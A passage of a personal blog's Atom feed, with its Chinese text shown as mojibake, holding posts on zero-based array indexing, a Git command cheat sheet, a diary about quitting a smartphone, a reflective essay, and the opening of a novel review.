class="line">greeting[<span class="number">1</span>] = <span class="string">&#x27;E&#x27;</span></span><br><span class="line">greeting[<span class="number">2</span>] = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œè¿™æ˜¯æˆ‘ä»¬é—®é¢˜çš„å›ç­”ã€‚å­—ç¬¦ä»0å¼€å§‹ç´¢å¼•å› ä¸ºè¿™è¡¨ç¤ºäº†ç›¸å¯¹äºå­—ç¬¦ä¸²å¼€å§‹ä½ç½®çš„åç§»ã€‚</p><p>** 2) æˆ‘è¿˜æ˜¯è®¤ä¸ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ åº”è¯¥ä»1å¼€å§‹ï¼Œè¿™æ ·é”™äº†å—ï¼Ÿ**</p><p>ä¸ï¼Œä¸€ç‚¹ä¹Ÿä¸ã€‚æœ‰å¾ˆå¤šè¯­è¨€éƒ½ä¼šè®¾è®¡æˆè¿™æ ·ï¼šå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½ç½®å¿…é¡»ä¸º1ã€‚ä¸€ä¸ªå¾ˆå¸¸è§çš„ä¾‹å­æ˜¯Matlabï¼Œå®ƒçš„ç´¢å¼•ä»1å¼€å§‹ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒMatlabæ˜¯åŸºäºFotrançš„ï¼ŒFotrançš„æ•°ç»„ç´¢å¼•ä»1å¼€å§‹ï¼Œæ‰€ä»¥ï¼Œæ”¹å˜æ—¶æ²¡æœ‰æ„ä¹‰çš„ã€‚</p><p>çœ‹åˆ°è¶‹åŠ¿äº†å—ï¼Ÿè¯­è¨€å¾€å¾€ä»ä»–ä»¬çš„çˆ¶è¾ˆä¸­ç»§æ‰¿è®¸å¤šåŸºæœ¬çš„ç‰¹æ€§ã€‚ç”±Cè¡ç”Ÿå‡ºæ¥çš„è¯­è¨€å€¾å‘äºä»0å¼€å§‹ç´¢å¼•ï¼Œæ¯”å¦‚C++ï¼Œobjective Cï¼ŒJavaï¼ŒPythonï¼Œ Perlï¼ŒJavascriptå’Œå…¶å®ƒè®¸å¤šè¯­è¨€ï¼Œ<a href="http://en.wikipedia.org/wiki/List_of_C-based_programming_languages">çœ‹è¿™</a>ã€‚æœ‰Fortranè¡ç”Ÿå‡ºæ¥çš„è¯­è¨€åˆ™å¾€å¾€ä»1å¼€å§‹æ‰€ä»¥ï¼Œå°±åƒMatalbå’ŒSimScriptä¸€æ ·ã€‚</p><p>å½“ç„¶ï¼Œè¿™äº›ç»§æ‰¿ä¸æ˜¯å¿…é¡»çš„ã€‚æ¯”å¦‚ï¼Œç›¸å¯¹äºå…¶ä»–è®¸å¤šCè¡ç”Ÿçš„è¯­è¨€ï¼ŒPythonä½¿ç”¨ç¼©è¿›æ¥è¡¨ç¤ºç»“æ„ï¼Œè€Œä¸æ˜¯èŠ±æ‹¬å·ã€‚æ•æˆ‘ç›´è¨€ï¼Œè¿™å¾ˆä¸å¯»å¸¸ï¼Œä½†ä¹Ÿä¸å¤±ä¸ºä¸€ä¸ªå¥½é€‰æ‹©ï¼Œå› ä¸ºä¸ºäº†æ¸…æ¥šï¼Œç»“æ„é‡Œçš„è¯­å¥ä¹Ÿä¼šç¼©è¿›ï¼Œä»è¿™ç‚¹çœ‹ï¼ŒèŠ±æ‹¬å·æˆ–è€…å…¶ä»–åˆ†éš”ç¬¦éƒ½æ˜¾å¾—å¤šä½™äº†ã€‚</p><p>** 3) å“ªä¸€ä¸ªæ›´å¥½å‘¢ï¼Œä»0å¼€å§‹è¿˜æ˜¯ä»1å¼€å§‹ï¼Ÿ**</p><p>éƒ½ä¸å¥½ã€‚å¦‚æœéœ€è¦ï¼Œä½¿ç”¨å¦ä¸€ä¸ªç´¢å¼•å¼€å§‹å€¼ä¹Ÿæ˜¯ç›¸å¯¹ç®€å•çš„ã€‚ç„¶è€Œï¼Œæœ‰ä¸€äº›ç®—æ³•è‡ªç„¶æ˜¯ä»0æˆ–è€…1å¼€å§‹çš„ï¼Œæ²¡æœ‰å…¶ä»–çš„ï¼Œæ‰€ä»¥å¯¹äºè¿™äº›æƒ…å†µä¸‹ï¼Œåœ¨å®ç°ä¸Šç•¥æœ‰ä¸åŒã€‚æ¯”å¦‚ï¼ŒäºŒå‰æŸ¥æ‰¾æ ‘ä»1å¼€å§‹ï¼Œæ‰€ä»¥ï¼Œåœ¨Pythonä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªä»0å¼€å§‹çš„æ•°ç»„æ´»ç€åˆ—è¡¨ï¼Œç„¶åå¿½ç•¥ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚åœ¨è¿™ç¯‡<a href="http://forums.udacity.com/questions/2006322/where-python-is-illogical?page=1&amp;focusedAnswerId=2022504#2022504">åšå®¢</a>ä¸­ï¼Œå…¶ä¸­æè¿°äº†æˆ‘ä»¬å¯ä»¥å¼ºåˆ¶Cä¸­çš„æ•°ç»„ä»1å¼€å§‹ç´¢å¼•ï¼Œä»¥åŠCå¼€å‘è€…ç¤¾åŒºæ˜¯æ€æ ·æ”¶åˆ°ä¸€æœ¬è¶‹åŠ¿è¯»è€…ä¹Ÿè¿™æ ·åšçš„ä¹¦ã€‚</p><p>åŸæ–‡åœ¨<a href="http://forums.udacity.com/questions/100086491/why-does-indexing-begin-at-0?page=1&amp;focusedAnswerId=100086607#100086607">è¿™å„¿</a>ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä¸ºä»€ä¹ˆpythonä¸­ç´¢å¼•ä»0å¼€å§‹
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>Git å°ç»“</title>
    <link href="https://qiwihui.com/qiwihui-blog-13/"/>
    <id>https://qiwihui.com/qiwihui-blog-13/</id>
    <published>2018-10-09T05:28:43.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æ•´ç†è‡ª<a href="http://www.cnblogs.com/tugenhua0707/p/4050072.html">æ‰‹æŠŠæ‰‹æ•™ä½ ç”¨git</a>.</p><span id="more"></span><ol><li><code>git reflog</code> æŸ¥çœ‹å†å²è®°å½•çš„ç‰ˆæœ¬å·id</li><li>Discard:<ul><li><code>git reset --hard HEAD^</code></li><li><code>git reset --hard HEAD~100</code></li><li><code>git reset --hard &lt;one commit&gt;</code></li></ul></li><li><code>git checkout -- &lt;file&gt;</code><ul><li>ä¿®æ”¹åï¼Œè¿˜æ²¡æœ‰æ”¾åˆ°æš‚å­˜åŒºï¼Œä½¿ç”¨ æ’¤é”€ä¿®æ”¹å°±å›åˆ°å’Œç‰ˆæœ¬åº“ä¸€æ¨¡ä¸€æ ·çš„çŠ¶æ€ã€‚</li><li>å¦å¤–ä¸€ç§æ˜¯ç¬¬ä¸€æ¬¡ä¿®æ”¹å·²ç»æ”¾å…¥æš‚å­˜åŒºäº†ï¼Œæ¥ç€åˆä½œäº†ä¿®æ”¹ï¼Œæ’¤é”€ä¿®æ”¹å°±å›åˆ°æ·»åŠ æš‚å­˜åŒºåçš„çŠ¶æ€ã€‚</li></ul></li><li>æš‚å­˜åŒº -&gt; å·¥ä½œåŒº<ul><li><code>git reset HEAD &lt;file&gt;</code></li><li>HEADä¸¥æ ¼æ¥è¯´ä¸æ˜¯æŒ‡å‘æäº¤ï¼Œè€Œæ˜¯æŒ‡å‘masterï¼Œmasteræ‰æ˜¯æŒ‡å‘æäº¤çš„ï¼Œæ‰€ä»¥ï¼ŒHEADæŒ‡å‘çš„å°±æ˜¯å½“å‰åˆ†æ”¯ã€‚</li></ul></li><li>push<ul><li><code>git remote add origin https://github.com/username/project_name.git</code> å…³è”ä¸€ä¸ªè¿œç¨‹åº“</li><li><code>git push â€“u origin master</code> (ç¬¬ä¸€æ¬¡è¦ç”¨-u, ä»¥åä¸éœ€è¦)</li></ul></li><li>åˆ†æ”¯ç®¡ç†ç­–ç•¥:<ul><li>é€šå¸¸åˆå¹¶åˆ†æ”¯æ—¶ï¼Œgitä¸€èˆ¬ä½¿ç”¨â€Fast forwardâ€æ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œåˆ é™¤åˆ†æ”¯åï¼Œä¼šä¸¢æ‰åˆ†æ”¯ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨å¸¦å‚æ•° â€“no-ffæ¥ç¦ç”¨â€Fast forwardâ€æ¨¡å¼ã€‚<code>git merge --no-ff -m &quot;comments&quot; &lt;branch_name&gt;</code></li><li>åˆ†æ”¯ç­–ç•¥ï¼šé¦–å…ˆmasterä¸»åˆ†æ”¯åº”è¯¥æ˜¯éå¸¸ç¨³å®šçš„ï¼Œä¹Ÿå°±æ˜¯ç”¨æ¥å‘å¸ƒæ–°ç‰ˆæœ¬ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸å…è®¸åœ¨ä¸Šé¢å¹²æ´»ï¼Œå¹²æ´»ä¸€èˆ¬æƒ…å†µä¸‹åœ¨æ–°å»ºçš„devåˆ†æ”¯ä¸Šå¹²æ´»ï¼Œå¹²å®Œåï¼Œæ¯”å¦‚ä¸Šè¦å‘å¸ƒï¼Œæˆ–è€…è¯´devåˆ†æ”¯ä»£ç ç¨³å®šåå¯ä»¥åˆå¹¶åˆ°ä¸»åˆ†æ”¯masterä¸Šæ¥ã€‚</li></ul></li><li><code>git stash</code>: å¯ä»¥æŠŠå½“å‰å·¥ä½œç°åœº â€éšè—èµ·æ¥â€ï¼Œç­‰ä»¥åæ¢å¤ç°åœºåç»§ç»­å·¥ä½œã€‚<ul><li><code>git stash list</code>: æŸ¥çœ‹</li><li>æ¢å¤ï¼š<ol><li><code>git stash apply</code> æ¢å¤ï¼Œæ¢å¤åï¼Œstashå†…å®¹å¹¶ä¸åˆ é™¤ï¼Œä½ éœ€è¦ä½¿ç”¨å‘½ä»¤<code>git stash drop</code>æ¥åˆ é™¤ã€‚</li><li>å¦ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨<code>git stash pop</code>,æ¢å¤çš„åŒæ—¶æŠŠstashå†…å®¹ä¹Ÿåˆ é™¤äº†ã€‚</li></ol></li></ul></li><li>å¤šäººåä½œï¼š<ul><li>æ¨é€åˆ†æ”¯ï¼š<ol><li>masteråˆ†æ”¯æ˜¯ä¸»åˆ†æ”¯ï¼Œå› æ­¤è¦æ—¶åˆ»ä¸è¿œç¨‹åŒæ­¥ã€‚</li><li>ä¸€äº›ä¿®å¤bugåˆ†æ”¯ä¸éœ€è¦æ¨é€åˆ°è¿œç¨‹å»ï¼Œå¯ä»¥å…ˆåˆå¹¶åˆ°ä¸»åˆ†æ”¯ä¸Šï¼Œç„¶åæŠŠä¸»åˆ†æ”¯masteræ¨é€åˆ°è¿œç¨‹å»ã€‚</li></ol></li><li>æŠ“å–åˆ†æ”¯ï¼š<ol><li>pushémasteråˆ†æ”¯(e.g. dev)ï¼š<code>git checkout â€“b dev origin/dev</code>, edit something, <code>git push origin dev</code></li><li>å¦ä¸€ä¸ªåŒä¼´æ›´æ–°ï¼š<code>git branch --set-upstream dev origin/dev</code>, <code>git pull</code>, edit something, <code>git push origin dev</code></li></ol></li><li>åä½œæ¨¡å¼ï¼š<ol><li>é¦–å…ˆï¼Œå¯ä»¥è¯•å›¾ç”¨<code>git push origin &lt;branch-name&gt;</code>æ¨é€è‡ªå·±çš„ä¿®æ”¹.</li><li>å¦‚æœæ¨é€å¤±è´¥ï¼Œåˆ™å› ä¸ºè¿œç¨‹åˆ†æ”¯æ¯”ä½ çš„æœ¬åœ°æ›´æ–°æ—©ï¼Œéœ€è¦å…ˆç”¨git pullè¯•å›¾åˆå¹¶ã€‚</li><li>å¦‚æœåˆå¹¶æœ‰å†²çªï¼Œåˆ™éœ€è¦è§£å†³å†²çªï¼Œå¹¶åœ¨æœ¬åœ°æäº¤ã€‚å†ç”¨<code>git push origin &lt;branch-name&gt;</code>æ¨é€ã€‚</li></ol></li></ul></li><li>delete remote branch<ul><li><code>git push origin â€”delete &lt;branch_name&gt;</code></li></ul></li><li>get remote branch locally<ul><li><code>git branch --set-upstream dev origin/dev</code></li></ul></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Git å°ç»“
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>æ²¡æœ‰æ™ºèƒ½æ‰‹æœºçš„ç¬¬ä¸€å¤©</title>
    <link href="https://qiwihui.com/qiwihui-blog-12/"/>
    <id>https://qiwihui.com/qiwihui-blog-12/</id>
    <published>2018-10-09T05:27:54.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨åœæ­¢åšå®¢çš„ä¸€ä¸ªå¤šæœˆæ—¶é—´é‡Œï¼Œæˆ‘é™¤äº†ä¸Šç­çš„äº”å¤©ç™½å¤©ï¼Œå†åŠ ä¸Šå‘¨æœ«å‡ºå»çˆ¬å±±çš„ä¸¤å¤©ï¼Œå‰©ä¸‹çš„æ—¶é—´å¾ˆå¤šéƒ½èŠ±åœ¨äº†æˆ‘é‚£åªæ™ºèƒ½æ‰‹æœºä¸Šï¼Œå¾®ä¿¡ï¼ŒQQï¼ŒG+ï¼Œä»¥åŠä¸€äº›æœ‰èŠ‚æ“å’Œæ²¡èŠ‚æ“çš„åº”ç”¨å’Œæ¸¸æˆï¼Œè¿™ä¸€ä¸ªå¤šæœˆçš„æ—¶é—´å°±è¿™æ ·è’èŠœçš„åº¦è¿‡äº†ã€‚</p><span id="more"></span><p>ç›´åˆ°æˆ‘æš‚åœå‡ºè¡Œçš„è®¡åˆ’ï¼Œæ›´å¤šåœ°å’Œæœ‹å‹æ¥è§¦ï¼Œæˆ‘æ‰è§‰å¾—ï¼Œæ™ºèƒ½æ‰‹æœºåœ¨ç»™æˆ‘å¸¦æ¥å¾ˆå¤§æ–¹ä¾¿çš„åŒæ—¶ï¼Œä¹Ÿä½¿å¾—æˆ‘çš„ç”Ÿæ´»å˜å¾—ç‹­çª„ï¼Œäº¤é™…å˜å¾—ç‹­éš˜ã€‚äºæ˜¯æˆ‘å†³å®šï¼šç¦»å¼€æ™ºèƒ½æ‰‹æœºä¸€åˆ°ä¸¤ä¸ªæœˆï¼Œå°±åƒå»å¹´æ‰‹æœºåæ‰ä¸€æ ·ã€‚</p><h2><span id="di-yi-tian"><strong>ç¬¬ä¸€å¤©</strong></span></h2><p>æˆ‘æŠŠæ‰‹æœºäº¤ç»™äº†æœ‹å‹ä¿ç®¡ï¼Œåœ¨å¾®ä¿¡ä¸Šå’ŒQQä¸Šç•™ä¸‹äº†ç”µè¯å’Œé‚®ç®±ï¼Œå¼€å§‹äº†æˆ‘ä¸€ä¸ªæœˆçš„éæ™ºèƒ½ç”Ÿæ´»ã€‚ç¬¬ä¸€å¤©æ˜¯å¾ˆè‰°éš¾çš„ï¼Œå°¤å…¶æ˜¯åœ¨çªç„¶ç¦»å¼€æ‰‹æœºä¹‹åï¼Œæˆ‘è·å–ä¿¡æ¯çš„æ–¹å¼ç›´æ¥è½¬ç§»åˆ°äº†ç”µè„‘ï¼Œè¿™å°±æ„å‘³ç€æˆ‘è¦å¾ˆå¤šæ—¶å€™å¼€ç€ç”µè„‘ï¼ŒèƒŒå•è¯ï¼Œé˜…è¯»æ–‡ç« ï¼Œæ”¶é‚®ä»¶ç­‰ç­‰éƒ½ä»æ‰‹æœºå‘ç”µè„‘è¿ç§»ï¼Œæ— å¯é€‰æ‹©ã€‚</p><p>ç¬¬ä¸€å¤©è®¡åˆ’çš„å®æ–½è¿˜æ˜¯æœ‰ç‚¹æ°´åˆ†çš„ï¼Œæ€»æ˜¯ä¸è‡ªè§‰åœ°æ‹¿èµ·é‚£å°å¾ˆå¤è€çš„æ‰‹æœºï¼Œæ‰“å¼€åˆå…³é—­ï¼Œæ‰èƒ½ç»§ç»­å›æ¥å­¦ä¹ å·¥ä½œï¼Œç„¶ååœ¨iPadä¸Šä¸Šäº†ä¸€ä¼šå¾®ä¿¡ï¼Œç„¶ååˆ äº†å¾®ä¿¡ï¼Œæ•´ç†äº†æ‰€æœ‰çš„ä¸éœ€è¦çš„ä¼šä¸Šç˜¾çš„è½¯ä»¶ï¼Œè¿™æ‰ç®—æ˜¯æ­£å¼å¼€å§‹äº†ã€‚</p><p>ç†äº†å¤´å‘è¡¨å†³å¿ƒã€‚</p><h2><span id="ji-hua"><strong>è®¡åˆ’</strong></span></h2><p>åœ¨æ¥ä¸‹æ¥çš„ä¸€ä¸¤ä¸ªæœˆçš„æ—¶é—´é‡Œï¼Œè®¡åˆ’æ˜¯è¿™æ ·çš„ï¼š</p><ul><li>å•è¯ &gt;100ä¸ª/å¤©ï¼Œè‹±æ–‡æ–‡ç« &gt;5ä¸ª/å¤©ï¼Œæœ‰æ‰‡è´ç½‘ç«™ç®¡ç†ã€‚</li><li>linux + python + mysql</li><li>ã€Šä¸€ä¸ªé™Œç”Ÿå¥³äººçš„æ¥ä¿¡ã€‹+ã€ŠLovely boneã€‹(English) + ã€Šå°ç‹å­ã€‹ç­‰</li><li>é”»ç‚¼ï¼š å¼€å§‹æˆ‘çš„ä¸ºå…¶50å‘¨çš„é©¬æ‹‰æ¾è®­ç»ƒè®¡åˆ’ã€‚</li><li>å¥åº·ç®¡ç†ï¼š çˆ¬ï¼Œåï¼Œèµ°ï¼Œè·‘â€¦</li><li>åå±±ä¹‹è¡Œï¼ˆä¹æœˆä»½ï¼‰ã€‚</li></ul><h2><span id="mu-biao"><strong>ç›®æ ‡</strong></span></h2><blockquote><p>å°½æœ€å¤§çš„è¯šæ„ï¼Œä½†ä¸çŸ¥é“ä½•æ—¶ä¼šæ¶ˆå¤±ï¼Œå¦‚æœå¯ä»¥ï¼Œå°±ä¸è¦<strong>å†è¯•ä¸€æ¬¡</strong>ã€‚</p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      æ²¡æœ‰æ™ºèƒ½æ‰‹æœºçš„ç¬¬ä¸€å¤©
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>Seek, think then speak</title>
    <link href="https://qiwihui.com/qiwihui-blog-11/"/>
    <id>https://qiwihui.com/qiwihui-blog-11/</id>
    <published>2018-10-09T05:27:20.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>â€œSeek, think then speakâ€ï¼Œè¿™æ˜¯æˆ‘åœ¨æˆ‘çš„<a href="https://twitter.com/Weihui_Q">Twitter</a>ä¸Šçš„ç­¾åï¼Œä¹Ÿæ˜¯æˆ‘åœ¨æ—¥å¸¸ç”Ÿæ´»å’Œå·¥ä½œä¸­ä¸€ä¸ªåšäº‹çš„åŸºæœ¬å‡†åˆ™ã€‚å½“è‡ªå·±å¾—åˆ°ä¸€ä¸ªæ¶ˆæ¯ï¼Œæˆ–è€…å¼€å§‹ä¸€ä¸ªæ–°çš„ä»»åŠ¡çš„æ—¶å€™ï¼Œä¸æ˜¯ä¸‹æ„è¯†åœ°å°±ç›¸ä¿¡è¿™ä¸ªæ¶ˆæ¯ï¼Œå¼€å§‹è¿™ä¸ªä»»åŠ¡ï¼Œè€Œæ˜¯è¦ç»è¿‡è¿™ä¸‰æ­¥è¿‡ç¨‹ä¹‹åï¼Œå¾—å‡ºè‡ªå·±çš„ç»“è®ºï¼Œæ‰å¼€å§‹è¡ŒåŠ¨ã€‚</p><span id="more"></span><h2><span id="seek"><strong>Seek</strong></span></h2><p>æ¢ç´¢ï¼Œæˆ–è€…è¯´æ˜¯å¯»æ±‚ï¼Œå°±æ˜¯å½“ä½ å¾—åˆ°è¿™ä¸ªæ¶ˆæ¯çš„æ—¶å€™ï¼Œä¸æ˜¯ç›²ç›®åœ°ç›¸ä¿¡ï¼Œè€Œæ˜¯å…ˆå¼€å§‹æ”¶é›†å’Œç”„åˆ«èµ„æ–™ã€‚åœ¨è¿™ä¸ªä¿¡æ¯åŒ–ä¸€ç›´ä¿¡æ¯çˆ†ç‚¸çš„æ—¶ä»£ï¼Œè¶Šæ¥è¶Šå¤šçš„è¯¯å¯¼å’Œè™šå‡æ¶ˆæ¯å……æ–¥åœ¨æˆ‘ä»¬çš„èº«è¾¹ï¼Œæ–°é—»ç”µè§†ï¼Œåª’ä½“èµ„è®¯ï¼Œç¤¾äº¤ç½‘ç»œï¼Œä¿¡æ¯æ–¹ä¾¿çš„åŒæ—¶ä¹Ÿå¯èƒ½æ˜¯è¯¯å¯¼å’Œè™šå‡æ¶ˆæ¯æ»‹ç”Ÿçš„æ¸©åºŠã€‚ä¿¡æ¯æœ¬æ— å¯¹é”™ï¼Œåªæ˜¯å½“å®ƒä»¬è¢«å°‘æ•°äººåˆ©ç”¨ï¼Œæ›²è§£çš„æ—¶å€™ï¼Œä¿¡æ¯çš„å¯¹é”™æ‰å¼€å§‹å˜å¾—æœ‰åˆ©å¯å›¾ã€‚</p><h2><span id="think"><strong>Think</strong></span></h2><p>æ€è€ƒï¼Œç»“åˆè‡ªå·±çš„çŸ¥è¯†èƒŒæ™¯å’Œæ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œæ€è€ƒä¿¡æ¯çš„å¯¹é”™ï¼Œä»¥åŠå…¶ä¸­ä¸ªæ‰€åŒ…å«çš„å…¶ä»–æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸€æ­¥éå¸¸é‡è¦çš„è¿‡ç¨‹ã€‚å–„æ¶åªåœ¨ä¸€å¿µä¹‹é—´ï¼Œè¿™ä¸€å¿µå°±æ˜¯ä½ çš„æ€è€ƒï¼Œä½ çš„æƒ³æ³•ã€‚æ€è€ƒï¼Œå¯ä»¥æ˜¯é“ç†æ›´æ·±åˆ»ï¼Œäº‹ç‰©æ›´é€å½»ï¼Œæ€è€ƒçš„å¥½å¤„ä¸è¨€è€Œå–»ï¼Œå¤ä»Šä¹‹é›†å¤§æˆè€…ï¼Œè«ä¸æ˜¯å–„äºæ€è€ƒçš„äººã€‚</p><h2><span id="speak"><strong>Speak</strong></span></h2><p>å‘è¨€ï¼Œåˆæˆ–è€…å¯ä»¥æ˜¯è¡ŒåŠ¨ï¼ˆMoveï¼‰ï¼Œå°±æ˜¯åœ¨æ€è€ƒä¹‹åè¡¨è¾¾è‡ªå·±çš„è§è§£ï¼Œé‡‡å–ä¸€å®šçš„è¡ŒåŠ¨æ”¯æŒè¿™ä¸ªè§è§£ï¼Œä»¥è¾¾åˆ°è¯´æœè‡ªå·±ï¼Œè¯´æœåˆ«äººï¼Œæ˜¯åˆ«äººè¾¾æˆå¯¹ä½ çš„å…±è¯†ï¼Œå°±å¦‚åŒæ¼”è®²å®¶å’Œè¡ŒåŠ¨æ´¾è¡¨ç°å‡ºæ¥çš„ä¸€æ ·ã€‚</p><p>æˆ‘æ›´å–œæ¬¢è¯¸å¦‚Twitterä¸€ç±»çš„è‡ªç”±å¼€æ”¾ç¤¾äº¤å·¥å…·ï¼Œä¸€ä¸ªé‡è¦çš„åŸå› æ˜¯æ¶ˆæ¯çš„å¯¹å†²ã€‚QQï¼Œå¾®ä¿¡ä¹‹ç±»çš„ç†Ÿäººç¤¾äº¤ï¼Œæ¶ˆæ¯ç›¸å¯¹å°é—­ï¼Œè€Œä¸”ç†Ÿäººä¼šå¼±åŒ–æˆ‘ä»¬å¯¹æ¶ˆæ¯çš„æ€è€ƒï¼Œåˆå¦‚å¾®åšï¼Œå´å› åˆ«æœ‰ç”¨å¿ƒçš„æ§åˆ¶å„¿å¤±å»äº†æœ¬æ¥çš„å¯¹å†²èƒ½åŠ›ã€‚ä½†è¿™ç§æƒ…å†µå‘ç”Ÿçš„æ—¶å€™ï¼Œ â€œSeekï¼Œthink then speakâ€ å°±å˜æ›´åŠ é‡è¦äº†ã€‚æ¯”å¦‚åœ¨MH370æ¶ˆå¤±çš„ä¸‰å››åï¼Œå¾®åšä¸Šå¼€å§‹æœ‰äººè°£ä¼ MH370å®‰å…¨è¿”èˆªï¼Œå¾®åšä¸Šå¾ˆå¿«æ¾„æ¸…ï¼Œå„¿å¾®ä¿¡åœˆå’ŒQQåœˆå°±æ— æ³•åŠæ—¶è·Ÿä¸Šï¼Œseekåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è®©æˆ‘æ²¡æœ‰è½»æ˜“ç›¸ä¿¡è¿™è¿™ä¸å®çš„ä¿¡æ¯ã€‚</p><p>Speak, åœ¨è¿™ä¸ªå®¹æ˜“å› ä¸ºè¨€è·ç½ªçš„æ—¶æœŸï¼Œå‘è¨€å’Œè¡ŒåŠ¨å˜å¾—æ„ˆåŠ é‡è¦ã€‚æ²‰é»˜æ˜¯é‡‘ï¼Œé‚£æ˜¯å› ä¸ºçœŸç†ï¼Œå¯¹äºéæ­£ä¹‰ï¼Œspeakæ‰æ˜¯çœŸç†ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Seek, think then speak
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="è§‚ç‚¹" scheme="https://qiwihui.com/tags/%E8%A7%82%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹ä¸å¹³å‡¡çš„ä¸–ç•Œ</title>
    <link href="https://qiwihui.com/qiwihui-blog-10/"/>
    <id>https://qiwihui.com/qiwihui-blog-10/</id>
    <published>2018-10-09T05:26:49.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘ä»Šå¤©è¦å»ä¸¤ä¸ªä¹¦åº—æ·˜ä¹¦ï¼Œä¸‡åœ£å›­å’Œè“ç¾Šä¹¦åŠï¼Œä¾¿å°±æƒ³èµ·äº†å»å¹´å…«æœˆè¯»è¿‡çš„å°è¯´ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹ã€‚å°è¯´æ˜¯ä¸‡å­¦æ•™è‚²çš„è€å¸ˆæ¨èçš„ï¼Œåœ¨åˆšå¼€å§‹å·¥ä½œçš„ç¬¬äºŒä¸ªæœˆäº†å°±å‘å¥‹å››ä¸ªæ˜ŸæœŸè¯»å®Œäº†ï¼Œæ—¶è‡³ä»Šæ—¥å·²ç»è¿‡å»å¿«ä¸€å¹´äº†ï¼Œå¯ä¹¦ä¸­çš„è®¸å¤šæƒ…èŠ‚ä¾æ—§å†å†åœ¨ç›®ã€‚</p><span id="more"></span><h2><span id="shu-zhong-de-gu-shi"><strong>ä¹¦ä¸­çš„æ•…äº‹</strong></span></h2><p>ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹è®²è¿°äº†ä»¥å­™å°‘å®‰å’Œå­™å°‘å¹³ä¸ºä»£è¡¨çš„æ™®é€šäººåœ¨å¤§æ—¶ä»£å†å²è¿›ç¨‹ä¸­èµ°è¿‡çš„è‰°éš¾æ›²æŠ˜çš„é“è·¯ã€‚æ—¶é—´åœ¨ä¸Šä¸ªå®é™…70åˆ°80å¹´ä»£ï¼Œä»æ··ä¹±åˆ°æ”¹é©å¼€æ”¾çš„æ—¶æœŸï¼Œæ—¶ä»£çš„å˜é©æ·±åˆ»åœ°å½±å“è¿™æ¯ä¸€ä»£äººçš„å‘½è¿ã€‚</p><p>å“¥å“¥å°‘å®‰ä¸€ç›´åœ¨å®¶åŠ³åŠ¨ï¼Œä¸æ‘æ”¯ä¹¦ç”°ç¦å ‚çš„å¥³å„¿ç”°æ¶¦å¶é’æ¢…ç«¹é©¬ï¼Œä¸¤äººäº’æœ‰çˆ±æ…•ä¹‹å¿ƒï¼Œå´é­åˆ°ç”°ç¦å ‚çš„åå¯¹ï¼Œç»è¿‡ç—›è‹¦çš„ç…ç†¬ï¼Œå°‘å®‰ä¸å±±è¥¿å‹¤åŠ³çš„å§‘å¨˜ç§€è²ç»“å©šï¼Œæ¶¦å¶ä¹Ÿåªèƒ½å«æ³ªä¸å€¾æ…•å¥¹çš„æå‘å‰ç»“å©šï¼Œæ”¹é©å¼€æ”¾åï¼Œæœºçµçš„å°‘å®‰çœ‹åˆ°æœºä¼šï¼Œå…ˆæ˜¯å¸¦é¢†ç”Ÿäº§å¯¹å®æ–½è´£ä»»åˆ¶ï¼Œååˆè¿›åŸæ‹‰ç –ï¼Œç”¨èµšçš„é’±åŠç 